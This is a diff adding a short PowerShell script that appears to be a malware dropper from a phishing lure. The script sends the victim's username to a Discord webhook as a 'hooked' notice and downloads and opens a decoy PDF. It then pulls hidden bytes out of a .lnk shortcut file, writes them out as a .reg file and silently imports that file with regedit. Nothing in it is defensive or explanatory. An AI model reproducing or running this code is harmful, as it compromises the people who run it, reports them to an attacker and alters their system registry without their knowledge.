@@ -1,0 +1,15 @@
+irm 'https://discord.com/api/webhooks/1207030572061429810/YCbwSoX3RSmP2FCgLJTGGO7qihDEEDzw4fc3Ryt5nF5I1-EVWYIQE9ewNP489-08kUcw' -Method Post -Body (@{content=":fishing_pole_and_fish: Hooked: $env:USERNAME"})
+  
+iwr 'https://files.catbox.moe/qvj6fx.pdf' -OutFile ($d = "$env:TEMP\metodo.pdf"); ii $d
+
+$1 = 2565719
+$2 = 5439
+Set-Location -Path $currentPath; 
+$dirPath = Get-Location;
+Set-Location -Path $dirPath.Path; 
+$lnkpaths = Get-ChildItem -Path $dirPath.Path -Recurse *.lnk | Where-Object { $_.length -eq 424796 } | Select-Object -ExpandProperty FullName;
+$lnkpath = if ($lnkpaths -is [array]) {$lnkpaths[0]} else {$lnkpaths};
+$exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount 424796 -ReadCount 424796;
+$exePath = Join-Path $env:public '17399.reg';
+Set-Content $exePath ([byte[]]($exeFile | Select-Object -Skip 4837)) -Encoding Byte;
+Start-Process -FilePath 'regedit' -ArgumentList '/s', $exePath;
